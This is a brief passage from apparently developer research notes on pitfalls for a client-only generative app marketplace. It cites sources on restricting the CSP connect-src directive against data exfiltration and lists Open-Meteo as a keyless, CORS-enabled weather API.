- CSP exfiltration literature (HIGH): centralcsp.com `connect-src` docs and HackTricks/Cobalt CSP-bypass guidance — "any use of wildcard will lead to data exfiltration"; restrict `connect-src` to specific necessary domains. https://centralcsp.com/docs/connect-src , https://hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html , https://www.cobalt.io/blog/csp-and-bypasses
- Keyless CORS-enabled data source (HIGH): Open-Meteo — no API key, CORS supported out of the box, 10k req/day free, `https://api.open-meteo.com/v1/forecast`. https://open-meteo.com/ , https://github.com/open-meteo/open-meteo

---
*Pitfalls research for: client-only generative app marketplace — v1.1 Real & Robust*
*Researched: 2026-06-25*
